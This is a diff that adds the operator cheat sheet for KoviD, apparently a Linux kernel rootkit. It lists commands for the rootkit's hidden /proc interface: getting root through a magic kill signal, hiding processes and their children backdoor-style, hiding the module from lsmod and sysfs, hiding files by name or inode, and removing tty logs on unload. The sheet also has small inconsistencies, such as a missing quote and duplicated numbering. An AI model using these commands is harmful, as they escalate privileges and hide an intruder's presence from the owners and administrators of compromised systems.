@@ -1,0 +1,64 @@
+# Assuming KoviD interface name is /proc/test
+# @See Makefile
+
+#1 /proc interface turn on
+    $ kill -SIGCONT 31337
+
+#2 /proc interface turn off
+    $ kill -SIGCONT 31337
+
+#3 Get ROOT
+    $ kill -SIGCONT 666
+    $ su
+
+#4 Hide a PID
+    $ echo <pid> >/proc/test
+
+#5 Unhide a PID
+    $ echo <pid> >/proc/test
+
+#6 Hide a PID in backdoor-style, hide children
+    $ echo "-bd <pid> >/proc/test
+
+#7 Undo #6
+    $ echo <pid> >/proc/test
+
+#8 Hide KoviD module from lsmod/sysfs  if not built with DEPLOY=1
+    $ echo "-h" >/proc/test
+
+#9 Undo #8 - can rmmod after
+    $ cat `/proc/test` >/proc/test
+
+#10 List hidden taks - debug mode only
+    $ echo "-s" >/proc/test
+    $ dmesg
+
+#11 Hide README.txt by inode number from current directory
+    $ echo "-a AAA `stat -c %i README.txt`" >/proc/test
+
+#12 Hide ALL files named README.txt - this bypass #11
+    $ echo "-a README.txt" >/proc/test
+
+#13 Undo #12 - this bypass #11
+    $ echo "-d README.txt" >/proc/test
+
+#14 List hidden tasks - debug mode only
+    $ echo "-s" >/proc/test
+    $ dmesg
+
+#14 List hidden files and directories - debug mode only
+    $ echo "-l" >/proc/test
+    $ dmesg
+
+#15 Mark tty log file to be removed when KoviD is rmmod'ed
+    $ echo "-t0" >/proc/test
+
+#16 Undo #15
+    $ echo "-t1" >/proc/test
+
+#17 Fetch the base address of a running process by PID number
+    $ echo "-b <PID>">/proc/kv
+    $ cat /proc/kv
+
+
+
